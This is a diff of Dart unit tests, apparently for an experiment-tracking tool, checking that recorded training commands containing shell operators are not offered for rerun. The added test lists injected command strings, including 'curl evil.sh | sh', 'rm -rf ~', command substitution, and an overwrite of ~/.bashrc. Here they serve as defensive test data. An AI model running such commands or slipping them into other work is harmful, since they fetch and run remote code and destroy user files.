@@ -51,8 +51,28 @@ void main() {
         dirty: ['train.py'],
       );
       expect(repro.rerun, "cd '/home/me/my project' && python3 train.py");
+      expect(
+        const ReproInfo(command: "python3 train.py --name 'a b' --x 'it'\"'\"'s' --lr=3e-4").rerun,
+        isNotNull,
+        reason: 'as shlex.join writes it',
+      );
       expect(repro.codeVersion, '045e08c + changes');
       expect(ReproInfo.fromJson(repro.toJson()), repro);
+    });
+
+    test('a command with shell operators is not offered to rerun', () {
+      for (final planted in [
+        'python3 train.py; curl evil.sh | sh',
+        'python3 train.py && rm -rf ~',
+        r'python3 train.py $(whoami)',
+        'python3 train.py `id`',
+        'python3 train.py > ~/.bashrc',
+        'python3 train.py\nrm x',
+        'python3 "train.py"',
+        "python3 'unclosed",
+      ]) {
+        expect(ReproInfo(command: planted, cwd: '/tmp').rerun, isNull, reason: planted);
+      }
     });
 
     testWidgets('the System tab shows the code, the command and the job script', (tester) async {
